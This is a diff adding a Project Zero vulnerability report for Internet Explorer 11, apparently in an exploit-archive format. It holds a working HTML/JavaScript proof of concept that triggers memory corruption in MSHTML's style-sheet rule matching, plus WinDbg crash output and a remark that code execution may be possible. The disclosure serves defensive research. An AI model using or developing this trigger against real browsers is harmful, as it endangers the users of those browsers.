@@ -1,0 +1,77 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1118
+
+There is a memory corruption vulnerability in Internet Explorer. The vulnerability was confirmed on Internet Explorer Version 11.576.14393.0 (Update Version 11.0.38) running on Windows 10 64-bit with page heap enabled for iexplore.exe process.
+
+PoC:
+
+===========================================================
+-->
+
+<!-- saved from url=(0014)about:internet -->
+<style>
+#details { transition-duration: 61s; }
+</style>
+<script>
+function go() {
+  document.fgColor = "foo";
+  m.setAttribute("foo", "bar");
+  document.head.innerHTML = "a";
+}
+</script>
+<body onload=go()>
+<details id="details">
+<summary style="transform: scaleY(4)">
+<marquee id="m" bgcolor="rgb(135,114,244)">aaaaaaaaaaaaa</marquee>
+<style></style>
+
+<!--
+===========================================================
+
+The crash happens in CStyleSheetArray::BuildListOfMatchedRules while attempting to read memory outside of the bounds of the object pointed by eax (possibly due to a type confusion issue, but I didn't investigate in detail). If that read is successful and attacker-controlled address is read into edi, this down the line leads to a write at the attacker controlled address in CStyleSheetArray::BuildListOfProbableRules. Thus it might be possible to turn the issue into code execution.
+
+Debug info:
+
+(d10.1504): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=0fb60f78 ebx=0b124940 ecx=00000006 edx=00000000 esi=0b124940 edi=173de770
+eip=71eb1137 esp=173dda30 ebp=173ddaa4 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+MSHTML!CStyleSheetArray::BuildListOfMatchedRules+0x77:
+71eb1137 8bb824010000    mov     edi,dword ptr [eax+124h] ds:002b:0fb6109c=????????
+
+0:021> r
+eax=0fb60f78 ebx=0b124940 ecx=00000006 edx=00000000 esi=0b124940 edi=173de770
+eip=71eb1137 esp=173dda30 ebp=173ddaa4 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+MSHTML!CStyleSheetArray::BuildListOfMatchedRules+0x77:
+71eb1137 8bb824010000    mov     edi,dword ptr [eax+124h] ds:002b:0fb6109c=????????
+
+0:021> k
+ # ChildEBP RetAddr  
+00 173ddaa4 71eb3674 MSHTML!CStyleSheetArray::BuildListOfMatchedRules+0x77
+01 173ddd6c 71eb041e MSHTML!CElement::ApplyStyleSheets+0x504
+02 173ddd9c 720b43e5 MSHTML!CElement::ApplyDefaultFormat+0x8e
+03 173de1b0 71edf524 MSHTML!CElement::ComputeFormatsVirtual+0xe25
+04 173de248 720b343a MSHTML!CElement::ComputeFormats+0x374
+05 173de274 720b36cd MSHTML!CFormatInfo::FindFormattingParent+0x45a
+06 173de690 71edf524 MSHTML!CElement::ComputeFormatsVirtual+0x10d
+07 173de738 71ede88b MSHTML!CElement::ComputeFormats+0x374
+08 173de754 71ede3c4 MSHTML!CTreeNode::ComputeFormats+0x6b
+09 173df3b0 722e4e79 MSHTML!CTreeNode::ComputeFormatsHelper+0x34
+0a 173df3b8 7201745c MSHTML!CTreeNode::GetSvgFormatHelper+0xa
+0b 173df3c0 72756588 MSHTML!Tree::Style::HasCompositionItems+0x26
+0c 173df3cc 72787473 MSHTML!Layout::InlineLayout::HasCompositionItems+0x28
+0d 173df5dc 72788c30 MSHTML!CDispScroller::CalcScrollBits+0x526
+0e 173df6c8 72246c2a MSHTML!CDispScroller::InvalidateScrollDelta+0x147
+0f 173df6f4 71d8174e MSHTML!`TextInput::TextInputLogging::Instance'::`2'::`dynamic atexit destructor for 'wrapper''+0xf8a1a
+10 173df710 71d81667 MSHTML!CRenderTaskApplyPSP::ProcessScrollerUpdateRequests+0x34
+11 173df740 71f0e9bb MSHTML!CRenderTaskApplyPSP::Execute+0xe7
+12 173df79c 71de27d3 MSHTML!CRenderThread::RenderThread+0x31b
+13 173df7ac 72fa17cd MSHTML!CRenderThread::StaticRenderThreadProc+0x23
+14 173df7e4 74c362c4 IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x8d
+15 173df7f8 77700fd9 KERNEL32!BaseThreadInitThunk+0x24
+16 173df840 77700fa4 ntdll!__RtlUserThreadStart+0x2f
+17 173df850 00000000 ntdll!_RtlUserThreadStart+0x1b
+-->
